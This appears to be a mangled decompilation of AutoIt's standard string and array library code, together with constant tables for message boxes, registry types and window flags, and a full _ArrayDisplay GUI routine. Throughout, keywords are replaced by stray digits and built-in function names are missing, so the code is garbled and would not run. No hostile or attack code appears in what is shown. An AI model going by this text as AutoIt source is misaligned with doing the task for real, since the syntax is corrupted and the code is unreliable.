0$str_nocasesense = 0
0$str_casesense = 1
0$str_nocasesensebasic = 2
0$str_stripleading = 1
0$str_striptrailing = 2
0$str_stripspaces = 4
0$str_stripall = 8
0$str_chrsplit = 0
0$str_entiresplit = 1
0$str_nocount = 2
0$str_regexpmatch = 0
0$str_regexparraymatch = 1
0$str_regexparrayfullmatch = 2
0$str_regexparrayglobalmatch = 3
0$str_regexparrayglobalfullmatch = 4
0$str_endisstart = 0
0$str_endnotstart = 1
_hextostring($shex)
(($shex, 2) == "0x")5$shex = "0x" & $shex
($shex)

_stringbetween($sstring, $sstart, $send, $imode = $str_endisstart, $bcase = 40)
$imode <> $str_endnotstart5$imode = $str_endisstart
$bcase = 415
$bcase = 40

$scase = $bcase ? "(?s)" : "(?is)"
$sstart = $sstart ? "\Q" & $sstart & "\E" : "\A"
$imode = $str_endisstart5
$send = $send ? "(?=\Q" & $send & "\E)" : "\z"

$send = $send ? "\Q" & $send & "\E" : "\z"

$areturn = ($sstring, $scase & $sstart & "(.*?)" & $send, $str_regexparrayglobalmatch)
@error534(1, 0, 0)
$areturn

_stringexplode($sstring, $sdelimiter, $ilimit = 0)
0$null = (0)
$ilimit = 415$ilimit = 0
$ilimit > 05
$sstring = ($sstring, $sdelimiter, $null, $ilimit)
$sdelimiter = $null
$ilimit < 05
$iindex = ($sstring, $sdelimiter, 0, $ilimit)
$iindex5
$sstring = ($sstring, $iindex - 1)


($sstring, $sdelimiter, $str_nocount)

_stringinsert($sstring, $sinsertstring, $iposition)
$iposition = ($iposition)
$ilength = ($sstring)
($iposition) > $ilength5
(1, 0, $sstring)

($sinsertstring)5$sinsertstring = ($sinsertstring)
($sstring)5$sstring = ($sstring)
$sinsertstring = ($sinsertstring, "\", "\\")
$iposition >= 05
($sstring, "(?s)\A(.{" & $iposition & "})(.*)\z", "${1}" & $sinsertstring & "$2")

($sstring, "(?s)\A(.*)(.{" & -$iposition & "})\z", "${1}" & $sinsertstring & "$2")


_stringproper($sstring)
$bcapnext = 39, $schr = "", $sreturn = ""
$i = 115($sstring)
$schr = ($sstring, $i, 1)

$bcapnext = 39
($schr, "[a-zA-ZÀ-ÿšœžŸ]")5
$schr = ($schr)
$bcapnext = 40

($schr, "[a-zA-ZÀ-ÿšœžŸ]")
$bcapnext = 39

$schr = ($schr)

$sreturn &= $schr

$sreturn

_stringrepeat($sstring, $irepeatcount)
$irepeatcount = ($irepeatcount)
($sstring) < 12$irepeatcount < 0534(1, 0, "")
$sresult = ""
$irepeatcount > 1
($irepeatcount, 1)5$sresult &= $sstring
$sstring &= $sstring
$irepeatcount = ($irepeatcount, 1)

$sstring & $sresult

_stringtitlecase($sstring)
$bcapnext = 39, $schr = "", $sreturn = ""
$i = 115($sstring)
$schr = ($sstring, $i, 1)

$bcapnext = 39
($schr, "[a-zA-Z\xC0-\xFF0-9]")5
$schr = ($schr)
$bcapnext = 40

($schr, "[a-zA-Z\xC0-\xFF'0-9]")
$bcapnext = 39

$schr = ($schr)

$sreturn &= $schr

$sreturn

_stringtohex($sstring)
(($sstring))

0$opt_coordsrelative = 0
0$opt_coordsabsolute = 1
0$opt_coordsclient = 2
0$opt_errorsilent = 0
0$opt_errorfatal = 1
0$opt_capsnostore = 0
0$opt_capsstore = 1
0$opt_matchstart = 1
0$opt_matchany = 2
0$opt_matchexact = 3
0$opt_matchadvanced = 4
0$ccs_top = 1
0$ccs_nomovey = 2
0$ccs_bottom = 3
0$ccs_noresize = 4
0$ccs_noparentalign = 8
0$ccs_nohilite = 16
0$ccs_adjustable = 32
0$ccs_nodivider = 64
0$ccs_vert = 128
0$ccs_left = 129
0$ccs_nomovex = 130
0$ccs_right = 131
0$dt_drivetype = 1
0$dt_ssdstatus = 2
0$dt_bustype = 3
0$objid_window = 0
0$objid_titlebar = -2
0$objid_sizegrip = -7
0$objid_caret = -8
0$objid_cursor = -9
0$objid_alert = -10
0$objid_sound = -11
0$dlg_notitle = 1
0$dlg_notontop = 2
0$dlg_textleft = 4
0$dlg_textright = 8
0$dlg_moveable = 16
0$dlg_textvcenter = 32
0$idc_unknown = 0
0$idc_appstarting = 1
0$idc_arrow = 2
0$idc_cross = 3
0$idc_hand = 32649
0$idc_help = 4
0$idc_ibeam = 5
0$idc_icon = 6
0$idc_no = 7
0$idc_size = 8
0$idc_sizeall = 9
0$idc_sizenesw = 10
0$idc_sizens = 11
0$idc_sizenwse = 12
0$idc_sizewe = 13
0$idc_uparrow = 14
0$idc_wait = 15
0$idi_application = 32512
0$idi_asterisk = 32516
0$idi_exclamation = 32515
0$idi_hand = 32513
0$idi_question = 32514
0$idi_winlogo = 32517
0$idi_shield = 32518
0$idi_error = $idi_hand
0$idi_information = $idi_asterisk
0$idi_warning = $idi_exclamation
0$sd_logoff = 0
0$sd_shutdown = 1
0$sd_reboot = 2
0$sd_force = 4
0$sd_powerdown = 8
0$sd_forcehung = 16
0$sd_standby = 32
0$sd_hibernate = 64
0$stdin_child = 1
0$stdout_child = 2
0$stderr_child = 4
0$stderr_merged = 8
0$stdio_inherit_parent = 16
0$run_create_new_console = 65536
0$ubound_dimensions = 0
0$ubound_rows = 1
0$ubound_columns = 2
0$mouseeventf_absolute = 32768
0$mouseeventf_move = 1
0$mouseeventf_leftdown = 2
0$mouseeventf_leftup = 4
0$mouseeventf_rightdown = 8
0$mouseeventf_rightup = 16
0$mouseeventf_middledown = 32
0$mouseeventf_middleup = 64
0$mouseeventf_wheel = 2048
0$mouseeventf_xdown = 128
0$mouseeventf_xup = 256
0$reg_none = 0
0$reg_sz = 1
0$reg_expand_sz = 2
0$reg_binary = 3
0$reg_dword = 4
0$reg_dword_little_endian = 4
0$reg_dword_big_endian = 5
0$reg_link = 6
0$reg_multi_sz = 7
0$reg_resource_list = 8
0$reg_full_resource_descriptor = 9
0$reg_resource_requirements_list = 10
0$reg_qword = 11
0$reg_qword_little_endian = 11
0$hwnd_bottom = 1
0$hwnd_notopmost = -2
0$hwnd_top = 0
0$hwnd_topmost = -1
0$swp_nosize = 1
0$swp_nomove = 2
0$swp_nozorder = 4
0$swp_noredraw = 8
0$swp_noactivate = 16
0$swp_framechanged = 32
0$swp_drawframe = 32
0$swp_showwindow = 64
0$swp_hidewindow = 128
0$swp_nocopybits = 256
0$swp_noownerzorder = 512
0$swp_noreposition = 512
0$swp_nosendchanging = 1024
0$swp_defererase = 8192
0$swp_asyncwindowpos = 16384
0$keyword_default = 1
0$keyword_null = 2
0$mb_ok = 0
0$mb_okcancel = 1
0$mb_abortretryignore = 2
0$mb_yesnocancel = 3
0$mb_yesno = 4
0$mb_retrycancel = 5
0$mb_canceltrycontinue = 6
0$mb_help = 16384
0$mb_iconstop = 16
0$mb_iconerror = 16
0$mb_iconhand = 16
0$mb_iconquestion = 32
0$mb_iconexclamation = 48
0$mb_iconwarning = 48
0$mb_iconinformation = 64
0$mb_iconasterisk = 64
0$mb_usericon = 128
0$mb_defbutton1 = 0
0$mb_defbutton2 = 256
0$mb_defbutton3 = 512
0$mb_defbutton4 = 768
0$mb_applmodal = 0
0$mb_systemmodal = 4096
0$mb_taskmodal = 8192
0$mb_default_desktop_only = 131072
0$mb_right = 524288
0$mb_rtlreading = 1048576
0$mb_setforeground = 65536
0$mb_topmost = 262144
0$mb_service_notification = 2097152
0$mb_rightjustified = $mb_right
0$idtimeout = -1
0$idok = 1
0$idcancel = 2
0$idabort = 3
0$idretry = 4
0$idignore = 5
0$idyes = 6
0$idno = 7
0$idclose = 8
0$idhelp = 9
0$idtryagain = 10
0$idcontinue = 11
_arrayadd(36$avarray, $vvalue, $istart = 0, $sdelim_item = "|", $sdelim_row = @CRLF, $hdatatype = 0)
$istart = 415$istart = 0
$sdelim_item = 415$sdelim_item = "|"
$sdelim_row = 415$sdelim_row = @CRLF
$hdatatype = 415$hdatatype = 0
($avarray)534(1, 0, -1)
$idim_1 = ($avarray, $ubound_rows)
($avarray, $ubound_dimensions)

($vvalue)5
($vvalue, $ubound_dimensions) <> 1534(5, 0, -1)
$hdatatype = 0

$atmp = ($vvalue, $sdelim_item, $str_nocount + $str_entiresplit)
($atmp, $ubound_rows) = 15
$atmp[0] = $vvalue
$hdatatype = 0

$vvalue = $atmp

$iadd = ($vvalue, $ubound_rows)
$avarray[$idim_1 + $iadd]
$i = 015$iadd - 1
($hdatatype)5
$avarray[$idim_1 + $i] = $hdatatype($vvalue[$i])

$avarray[$idim_1 + $i] = $vvalue[$i]


$idim_1 + $iadd - 1

$idim_2 = ($avarray, $ubound_columns)
$istart < 02$istart > $idim_2 - 1534(4, 0, -1)
$ivaldim_1, $ivaldim_2
($vvalue)5
($vvalue, $ubound_dimensions) <> 2534(5, 0, -1)
$ivaldim_1 = ($vvalue, $ubound_rows)
$ivaldim_2 = ($vvalue, $ubound_columns)
$hdatatype = 0

$asplit_1 = ($vvalue, $sdelim_row, $str_nocount + $str_entiresplit)
$ivaldim_1 = ($asplit_1, $ubound_rows)
($asplit_1[0], $sdelim_item, "")
$ivaldim_2 = @extended + 1
$atmp[$ivaldim_1][$ivaldim_2], $asplit_2
$i = 015$ivaldim_1 - 1
$asplit_2 = ($asplit_1[$i], $sdelim_item, $str_nocount + $str_entiresplit)
$j = 015$ivaldim_2 - 1
$atmp[$i][$j] = $asplit_2[$j]


$vvalue = $atmp

($vvalue, $ubound_columns) + $istart > ($avarray, $ubound_columns)534(3, 0, -1)
$avarray[$idim_1 + $ivaldim_1][$idim_2]
$iwriteto_index = 015$ivaldim_1 - 1
$j = 015$idim_2 - 1
$j < $istart5
$avarray[$iwriteto_index + $idim_1][$j] = ""
$j - $istart > $ivaldim_2 - 15
$avarray[$iwriteto_index + $idim_1][$j] = ""

($hdatatype)5
$avarray[$iwriteto_index + $idim_1][$j] = $hdatatype($vvalue[$iwriteto_index][$j - $istart])

$avarray[$iwriteto_index + $idim_1][$j] = $vvalue[$iwriteto_index][$j - $istart]





(2, 0, -1)

($avarray, $ubound_rows) - 1

_arraybinarysearch(3036$avarray, $vvalue, $istart = 0, $iend = 0, $icolumn = 0)
$istart = 415$istart = 0
$iend = 415$iend = 0
$icolumn = 415$icolumn = 0
($avarray)534(1, 0, -1)
$idim_1 = ($avarray, $ubound_rows)
$idim_1 = 0534(6, 0, -1)
$iend < 12$iend > $idim_1 - 15$iend = $idim_1 - 1
$istart < 05$istart = 0
$istart > $iend534(4, 0, -1)
$imid = (($iend + $istart) / 2)
($avarray, $ubound_dimensions)

$avarray[$istart] > $vvalue2$avarray[$iend] < $vvalue534(2, 0, -1)
$istart <= $imid1$vvalue <> $avarray[$imid]
$vvalue < $avarray[$imid]5
$iend = $imid - 1

$istart = $imid + 1

$imid = (($iend + $istart) / 2)

$istart > $iend534(3, 0, -1)

$idim_2 = ($avarray, $ubound_columns) - 1
$icolumn < 02$icolumn > $idim_2534(7, 0, -1)
$avarray[$istart][$icolumn] > $vvalue2$avarray[$iend][$icolumn] < $vvalue534(2, 0, -1)
$istart <= $imid1$vvalue <> $avarray[$imid][$icolumn]
$vvalue < $avarray[$imid][$icolumn]5
$iend = $imid - 1

$istart = $imid + 1

$imid = (($iend + $istart) / 2)

$istart > $iend534(3, 0, -1)

(5, 0, -1)

$imid

_arraycoldelete(36$avarray, $icolumn, $bconvert = 40)
$bconvert = 415$bconvert = 40
($avarray)534(1, 0, -1)
$idim_1 = ($avarray, $ubound_rows)
($avarray, $ubound_dimensions) <> 2534(2, 0, -1)
$idim_2 = ($avarray, $ubound_columns)
$idim_2

$icolumn < 02$icolumn > 1534(3, 0, -1)
$bconvert5
$atemparray[$idim_1]
$i = 015$idim_1 - 1
$atemparray[$i] = $avarray[$i][(3$icolumn)]

$avarray = $atemparray




$icolumn < 02$icolumn > $idim_2 - 1534(3, 0, -1)
$i = 015$idim_1 - 1
$j = $icolumn15$idim_2 - 2
$avarray[$i][$j] = $avarray[$i][$j + 1]


$avarray[$idim_1][$idim_2 - 1]

($avarray, $ubound_columns)

_arraycolinsert(36$avarray, $icolumn)
($avarray)534(1, 0, -1)
$idim_1 = ($avarray, $ubound_rows)
($avarray, $ubound_dimensions)

$atemparray[$idim_1][2]
$icolumn
, 1
$i = 015$idim_1 - 1
$atemparray[$i][(3$icolumn)] = $avarray[$i]


(3, 0, -1)

$avarray = $atemparray

$idim_2 = ($avarray, $ubound_columns)
$icolumn < 02$icolumn > $idim_2534(3, 0, -1)
$avarray[$idim_1][$idim_2 + 1]
$i = 015$idim_1 - 1
$j = $idim_215$icolumn + 116 - 1
$avarray[$i][$j] = $avarray[$i][$j - 1]

$avarray[$i][$icolumn] = ""


(2, 0, -1)

($avarray, $ubound_columns)

_arraycombinations(3036$avarray, $iset, $sdelim = "")
$sdelim = 415$sdelim = ""
($avarray)534(1, 0, 0)
($avarray, $ubound_dimensions) <> 1534(2, 0, 0)
$in = ($avarray)
$ir = $iset
$aidx[$ir]
$i = 015$ir - 1
$aidx[$i] = $i

$itotal = __array_combinations($in, $ir)
$ileft = $itotal
$aresult[$itotal + 1]
$aresult[0] = $itotal
$icount = 1
$ileft > 0
__array_getnext($in, $ir, $ileft, $itotal, $aidx)
$i = 015$iset - 1
$aresult[$icount] &= $avarray[$aidx[$i]] & $sdelim

$sdelim <> ""5$aresult[$icount] = ($aresult[$icount], 1)
$icount += 1

$aresult

_arrayconcatenate(36$avarray_tgt, 3036$avarray_src, $istart = 0)
$istart = 415$istart = 0
($avarray_tgt)534(1, 0, -1)
($avarray_src)534(2, 0, -1)
$idim_total_tgt = ($avarray_tgt, $ubound_dimensions)
$idim_total_src = ($avarray_src, $ubound_dimensions)
$idim_1_tgt = ($avarray_tgt, $ubound_rows)
$idim_1_src = ($avarray_src, $ubound_rows)
$istart < 02$istart > $idim_1_src - 1534(6, 0, -1)
$idim_total_tgt

$idim_total_src <> 1534(4, 0, -1)
$avarray_tgt[$idim_1_tgt + $idim_1_src - $istart]
$i = $istart15$idim_1_src - 1
$avarray_tgt[$idim_1_tgt + $i - $istart] = $avarray_src[$i]


$idim_total_src <> 2534(4, 0, -1)
$idim_2_tgt = ($avarray_tgt, $ubound_columns)
($avarray_src, $ubound_columns) <> $idim_2_tgt534(5, 0, -1)
$avarray_tgt[$idim_1_tgt + $idim_1_src - $istart][$idim_2_tgt]
$i = $istart15$idim_1_src - 1
$j = 015$idim_2_tgt - 1
$avarray_tgt[$idim_1_tgt + $i - $istart][$j] = $avarray_src[$i][$j]



(3, 0, -1)

($avarray_tgt, $ubound_rows)

_arraydelete(36$avarray, $vrange)
($avarray)534(1, 0, -1)
$idim_1 = ($avarray, $ubound_rows) - 1
($vrange)5
($vrange, $ubound_dimensions) <> 12($vrange, $ubound_rows) < 2534(4, 0, -1)

$inumber, $asplit_1, $asplit_2
$vrange = ($vrange, 8)
$asplit_1 = ($vrange, ";")
$vrange = ""
$i = 115$asplit_1[0]
($asplit_1[$i], "^\d+(-\d+)?$")534(3, 0, -1)
$asplit_2 = ($asplit_1[$i], "-")
$asplit_2[0]

$vrange &= $asplit_2[1] & ";"

($asplit_2[2]) >= ($asplit_2[1])5
$inumber = $asplit_2[1] - 1

$inumber += 1
$vrange &= $inumber & ";"
$inumber = $asplit_2[2]



$vrange = (($vrange, 1), ";")

$vrange[1] < 02$vrange[$vrange[0]] > $idim_1534(5, 0, -1)
$icopyto_index = 0
($avarray, $ubound_dimensions)

$i = 115$vrange[0]
$avarray[$vrange[$i]] = (64177)

$ireadfrom_index = 015$idim_1
$avarray[$ireadfrom_index] == (64177)5


$ireadfrom_index <> $icopyto_index5
$avarray[$icopyto_index] = $avarray[$ireadfrom_index]

$icopyto_index += 1


$avarray[$idim_1 - $vrange[0] + 1]

$idim_2 = ($avarray, $ubound_columns) - 1
$i = 115$vrange[0]
$avarray[$vrange[$i]][0] = (64177)

$ireadfrom_index = 015$idim_1
$avarray[$ireadfrom_index][0] == (64177)5


$ireadfrom_index <> $icopyto_index5
$j = 015$idim_2
$avarray[$icopyto_index][$j] = $avarray[$ireadfrom_index][$j]


$icopyto_index += 1


$avarray[$idim_1 - $vrange[0] + 1][$idim_2 + 1]

(2, 0, 40)

($avarray, $ubound_rows)

_arraydisplay(3036$avarray, $stitle = 41, $sarray_range = 41, $iflags = 41, $vuser_separator = 41, $sheader = 41, $imax_colwidth = 41, $ialt_color = 41, $huser_func = 41)
$stitle = 415$stitle = "ArrayDisplay"
$sarray_range = 415$sarray_range = ""
$iflags = 415$iflags = 0
$vuser_separator = 415$vuser_separator = ""
$sheader = 415$sheader = ""
$imax_colwidth = 415$imax_colwidth = 350
$ialt_color = 415$ialt_color = 0
$huser_func = 415$huser_func = 0
$itranspose = ($iflags, 1)
$icolalign = ($iflags, 6)
$iverbose = ($iflags, 8)
$ibuttonmargin = ((($iflags, 32)) ? (0) : ((($iflags, 16)) ? (20) : (40)))
$inorow = ($iflags, 64)
$smsg = "", $iret = 1
($avarray)5
$idimension = ($avarray, $ubound_dimensions), $irowcount = ($avarray, $ubound_rows), $icolcount = ($avarray, $ubound_columns)
$idimension > 25
$smsg = "Larger than 2D array passed to function"
$iret = 2


$smsg = "No array variable passed to function"

$smsg5
$iverbose1($mb_systemmodal + $mb_iconerror + $mb_yesno, "ArrayDisplay Error: " & $stitle, $smsg & @CRLF & @CRLF & "Exit the script?") = $idyes5


($iret, 0, "")


$icw_colwidth = ($vuser_separator)
$sad_separator = (64177)
$scurr_separator = ("GUIDataSeparatorChar", $sad_separator)
$vuser_separator = ""5$vuser_separator = $scurr_separator
$vtmp, $irowlimit = 65525, $icollimit = 250
$idatarow = $irowcount
$idatacol = $icolcount
$iitem_start = 0, $iitem_end = $irowcount - 1, $isubitem_start = 0, $isubitem_end = (($idimension = 2) ? ($icolcount - 1) : (0))
$brange_flag = 40
$sarray_range5
$aarray_range = ($sarray_range & "||", "(?U)(.*)\|", 3)
$avrangesplit = ($aarray_range[0], ":")
@error5
($avrangesplit[1])5
$iitem_end = ($avrangesplit[1])


$iitem_start = ($avrangesplit[1])
($avrangesplit[2])5
$iitem_end = ($avrangesplit[2])


$iitem_start > $iitem_end5
$vtmp = $iitem_start
$iitem_start = $iitem_end
$iitem_end = $vtmp

$iitem_start < 05$iitem_start = 0
$iitem_end > $irowcount - 15$iitem_end = $irowcount - 1
$iitem_start <> 02$iitem_end <> $irowcount - 15$brange_flag = 39
$idimension = 25
$avrangesplit = ($aarray_range[1], ":")
@error5
($avrangesplit[1])5
$isubitem_end = ($avrangesplit[1])


$isubitem_start = ($avrangesplit[1])
($avrangesplit[2])5
$isubitem_end = ($avrangesplit[2])


$isubitem_start > $isubitem_end5
$vtmp = $isubitem_start
$isubitem_start = $isubitem_end
$isubitem_end = $vtmp

$isubitem_start < 05$isubitem_start = 0
$isubitem_end > $icolcount - 15$isubitem_end = $icolcount - 1
$isubitem_start <> 02$isubitem_end <> $icolcount - 15$brange_flag = 39


$sdisplaydata = "[" & $idatarow
$btruncated = 40
$itranspose5
$iitem_end - $iitem_start > $icollimit5
$btruncated = 39
$iitem_end = $iitem_start + $icollimit - 1


$iitem_end - $iitem_start > $irowlimit5
$btruncated = 39
$iitem_end = $iitem_start + $irowlimit - 1


$btruncated5
$sdisplaydata &= "*]"

$sdisplaydata &= "]"

$idimension = 25
$sdisplaydata &= " [" & $idatacol
$itranspose5
$isubitem_end - $isubitem_start > $irowlimit5
$btruncated = 39
$isubitem_end = $isubitem_start + $irowlimit - 1


$isubitem_end - $isubitem_start > $icollimit5
$btruncated = 39
$isubitem_end = $isubitem_start + $icollimit - 1


$btruncated5
$sdisplaydata &= "*]"

$sdisplaydata &= "]"


$stipdata = ""
$btruncated5$stipdata &= "Truncated"
$brange_flag5
$stipdata5$stipdata &= " - "
$stipdata &= "Range set"

$itranspose5
$stipdata5$stipdata &= " - "
$stipdata &= "Transposed"

$asheader = ($sheader, $scurr_separator, $str_nocount)
($asheader) = 0528$asheader[1] = [""]
$sheader = "Row"
$iindex = $isubitem_start
$itranspose5
$j = $iitem_start15$iitem_end
$sheader &= $sad_separator & "Col " & $j


$asheader[0]5
$iindex = $isubitem_start15$isubitem_end
$iindex >= ($asheader)518
$sheader &= $sad_separator & $asheader[$iindex]


$j = $iindex15$isubitem_end
$sheader &= $sad_separator & "Col " & $j


$inorow5$sheader = ($sheader, 4)
$iverbose($iitem_end - $iitem_start + 1) * ($isubitem_end - $isubitem_start + 1) > 100005
("ArrayDisplay", "Preparing display" & @CRLF & @CRLF & "Please be patient", 300, 100)

$ibuffer = 4094
$itranspose5
$vtmp = $iitem_start
$iitem_start = $isubitem_start
$isubitem_start = $vtmp
$vtmp = $iitem_end
$iitem_end = $isubitem_end
$isubitem_end = $vtmp

$avarraytext[$iitem_end - $iitem_start + 1]
$i = $iitem_start15$iitem_end
$inorow5$avarraytext[$i - $iitem_start] = "[" & $i & "]"
$j = $isubitem_start15$isubitem_end
$idimension = 15
$itranspose5
$vtmp = $avarray[$j]

$vtmp = $avarray[$i]


$itranspose5
$vtmp = $avarray[$j][$i]

$vtmp = $avarray[$i][$j]


($vtmp) > $ibuffer5$vtmp = ($vtmp, $ibuffer)
$avarraytext[$i - $iitem_start] &= $sad_separator & $vtmp

$inorow5$avarraytext[$i - $iitem_start] = ($avarraytext[$i - $iitem_start], 1)

0$_arrayconstant_gui_dockbottom = 64
0$_arrayconstant_gui_dockborders = 102
0$_arrayconstant_gui_dockheight = 512
0$_arrayconstant_gui_dockleft = 2
0$_arrayconstant_gui_dockright = 4
0$_arrayconstant_gui_dockhcenter = 8
0$_arrayconstant_gui_event_close = -3
0$_arrayconstant_gui_focus = 256
0$_arrayconstant_gui_bkcolor_lv_alternate = -33554432
0$_arrayconstant_ss_center = 1
0$_arrayconstant_ss_centerimage = 512
0$_arrayconstant_lvm_getitemcount = (4096 + 4)
0$_arrayconstant_lvm_getitemrect = (4096 + 14)
0$_arrayconstant_lvm_getcolumnwidth = (4096 + 29)
0$_arrayconstant_lvm_setcolumnwidth = (4096 + 30)
0$_arrayconstant_lvm_getitemstate = (4096 + 44)
0$_arrayconstant_lvm_getselectedcount = (4096 + 50)
0$_arrayconstant_lvm_setextendedlistviewstyle = (4096 + 54)
0$_arrayconstant_lvs_ex_gridlines = 1
0$_arrayconstant_lvis_selected = 2
0$_arrayconstant_lvs_showselalways = 8
0$_arrayconstant_lvs_ex_fullrowselect = 32
0$_arrayconstant_ws_ex_clientedge = 512
0$_arrayconstant_ws_maximizebox = 65536
0$_arrayconstant_ws_minimizebox = 131072
0$_arrayconstant_ws_sizebox = 262144
0$_arrayconstant_wm_setredraw = 11
0$_arrayconstant_lvscw_autosize = -1
$iorgwidth = 210, $iheight = 200, $iminsize = 250
$hgui = ($stitle, $iorgwidth, $iheight, 41, 41, ($_arrayconstant_ws_sizebox, $_arrayconstant_ws_minimizebox, $_arrayconstant_ws_maximizebox))
$aiguisize = ($hgui)
$ibuttonwidth_2 = $aiguisize[0] / 2
$ibuttonwidth_3 = $aiguisize[0] / 3
$idlistview = ($sheader, 0, 0, $aiguisize[0], $aiguisize[1] - $ibuttonmargin, $_arrayconstant_lvs_showselalways)
($idlistview, $_arrayconstant_gui_bkcolor_lv_alternate)
($idlistview, $_arrayconstant_lvm_setextendedlistviewstyle, $_arrayconstant_lvs_ex_gridlines, $_arrayconstant_lvs_ex_gridlines)
($idlistview, $_arrayconstant_lvm_setextendedlistviewstyle, $_arrayconstant_lvs_ex_fullrowselect, $_arrayconstant_lvs_ex_fullrowselect)
($idlistview, $_arrayconstant_lvm_setextendedlistviewstyle, $_arrayconstant_ws_ex_clientedge, $_arrayconstant_ws_ex_clientedge)
$idcopy_id = 9999, $idcopy_data = 99999, $iddata_label = 99999, $iduser_func = 99999, $idexit_script = 99999
$ibuttonmargin5
$idcopy_id = ("Copy Data && Hdr/Row", 0, $aiguisize[1] - $ibuttonmargin, $ibuttonwidth_2, 20)
$idcopy_data = ("Copy Data Only", $ibuttonwidth_2, $aiguisize[1] - $ibuttonmargin, $ibuttonwidth_2, 20)
$ibuttonmargin = 405
$ibuttonwidth_var = $ibuttonwidth_2
$ioffset = $ibuttonwidth_2
($huser_func)5
$iduser_func = ("Run User Func", $ibuttonwidth_3, $aiguisize[1] - 20, $ibuttonwidth_3, 20)
$ibuttonwidth_var = $ibuttonwidth_3
$ioffset = $ibuttonwidth_3 * 2

$idexit_script = ("Exit Script", $ioffset, $aiguisize[1] - 20, $ibuttonwidth_var, 20)
$iddata_label = ($sdisplaydata, 0, $aiguisize[1] - 20, $ibuttonwidth_var, 18, ($_arrayconstant_ss_center, $_arrayconstant_ss_centerimage))

$btruncated2$itranspose2$brange_flag
($iddata_label, 16711680)
($iddata_label, $stipdata)



($idlistview, $_arrayconstant_gui_dockborders)
($idcopy_id, $_arrayconstant_gui_dockleft + $_arrayconstant_gui_dockbottom + $_arrayconstant_gui_dockheight)
($idcopy_data, $_arrayconstant_gui_dockright + $_arrayconstant_gui_dockbottom + $_arrayconstant_gui_dockheight)
($iddata_label, $_arrayconstant_gui_dockleft + $_arrayconstant_gui_dockbottom + $_arrayconstant_gui_dockheight)
($iduser_func, $_arrayconstant_gui_dockhcenter + $_arrayconstant_gui_dockbottom + $_arrayconstant_gui_dockheight)
($idexit_script, $_arrayconstant_gui_dockright + $_arrayconstant_gui_dockbottom + $_arrayconstant_gui_dockheight)
($idlistview, $_arrayconstant_wm_setredraw, 0, 0)
$iditem
$i = 015($avarraytext) - 1
$iditem = ($avarraytext[$i], $idlistview)
$ialt_color5
($iditem, $ialt_color)


$icolalign5
0$_arrayconstant_lvcf_fmt = 1
0$_arrayconstant_lvm_setcolumnw = (4096 + 96)
$tcolumn = ("uint Mask;int Fmt;int CX;ptr Text;int TextMax;int SubItem;int Image;int Order;int cxMin;int cxDefault;int cxIdeal")
($tcolumn, "Mask", $_arrayconstant_lvcf_fmt)
($tcolumn, "Fmt", $icolalign / 2)
$pcolumn = ($tcolumn)
$i = 115$isubitem_end - $isubitem_start + 1
($idlistview, $_arrayconstant_lvm_setcolumnw, $i, $pcolumn)


($idlistview, $_arrayconstant_wm_setredraw, 1, 0)
$iborder = 45
($avarraytext) > 205
$iborder += 20

$iwidth = $iborder, $icolwidth = 0, $aicolwidth[$isubitem_end - $isubitem_start + 2], $imin_colwidth = 55
$i = 015$isubitem_end - $isubitem_start + 1
($idlistview, $_arrayconstant_lvm_setcolumnwidth, $i, $_arrayconstant_lvscw_autosize)
$icolwidth = ($idlistview, $_arrayconstant_lvm_getcolumnwidth, $i, 0)
$icolwidth < $imin_colwidth5
($idlistview, $_arrayconstant_lvm_setcolumnwidth, $i, $imin_colwidth)
$icolwidth = $imin_colwidth

$iwidth += $icolwidth
$aicolwidth[$i] = $icolwidth

$inorow5$iwidth -= 55
$iwidth > @DesktopWidth - 1005
$iwidth = $iborder
$i = 015$isubitem_end - $isubitem_start + 1
$aicolwidth[$i] > $imax_colwidth5
($idlistview, $_arrayconstant_lvm_setcolumnwidth, $i, $imax_colwidth)
$iwidth += $imax_colwidth

$iwidth += $aicolwidth[$i]



$iwidth > @DesktopWidth - 1005
$iwidth = @DesktopWidth - 100
$iwidth < $iminsize5
$iwidth = $iminsize

$trect = ("struct; long Left;long Top;long Right;long Bottom; endstruct")
("user32.dll", "struct*", "SendMessageW", "hwnd", ($idlistview), "uint", $_arrayconstant_lvm_getitemrect, "wparam", 0, "struct*", $trect)
$aiwin_pos = ($hgui)
$ailv_pos = ($hgui, "", $idlistview)
$iheight = ((($avarraytext) + 2) * (($trect, "Bottom") - ($trect, "Top"))) + $aiwin_pos[3] - $ailv_pos[3]
$iheight > @DesktopHeight - 1005
$iheight = @DesktopHeight - 100
$iheight < $iminsize5
$iheight = $iminsize

()
(@SW_HIDE, $hgui)
($hgui, "", (@DesktopWidth - $iwidth) / 2, (@DesktopHeight - $iheight) / 2, $iwidth, $iheight)
(@SW_SHOW, $hgui)
$ioneventmode = ("GUIOnEventMode", 0), $imsg

$imsg = ()
$imsg
$_arrayconstant_gui_event_close

$idcopy_id, $idcopy_data
$isel_count = ($idlistview, $_arrayconstant_lvm_getselectedcount, 0, 0)
$iverbose(3$isel_count)($iitem_end - $iitem_start) * ($isubitem_end - $isubitem_start) > 100005
("ArrayDisplay", "Copying data" & @CRLF & @CRLF & "Please be patient", 300, 100)

$sclip = "", $sitem, $asplit
$i = 015$iitem_end - $iitem_start
$isel_count(($idlistview, $_arrayconstant_lvm_getitemstate, $i, $_arrayconstant_lvis_selected))5


$sitem = $avarraytext[$i]
$imsg = $idcopy_data5
$sitem = ($sitem, "^\[\d+\].(.*)$", "$1")

$icw_colwidth5
$asplit = ($sitem, $sad_separator)
$sitem = ""
$j = 115$asplit[0]
$sitem &= ("%-" & $icw_colwidth + 1 & "s", ($asplit[$j], $icw_colwidth))


$sitem = ($sitem, $sad_separator, $vuser_separator)

$sclip &= $sitem & @CRLF

$imsg = $idcopy_id5
$icw_colwidth5
$asplit = ($sheader, $sad_separator)
$sitem = ""
$j = 115$asplit[0]
$sitem &= ("%-" & $icw_colwidth + 1 & "s", ($asplit[$j], $icw_colwidth))


$sitem = ($sheader, $sad_separator, $vuser_separator)

$sclip = $sitem & @CRLF & $sclip

($sclip)
()
($idlistview, $_arrayconstant_gui_focus)
$iduser_func
$aiselitems[$irowlimit] = [0]
$i = 015($idlistview, $_arrayconstant_lvm_getitemcount, 0, 0)
($idlistview, $_arrayconstant_lvm_getitemstate, $i, $_arrayconstant_lvis_selected)5
$aiselitems[0] += 1
$aiselitems[$aiselitems[0]] = $i + $iitem_start


$aiselitems[$aiselitems[0] + 1]
$huser_func($avarray, $aiselitems)
($idlistview, $_arrayconstant_gui_focus)
$idexit_script
($hgui)



($hgui)
("GUIOnEventMode", $ioneventmode)
("GUIDataSeparatorChar", $scurr_separator)


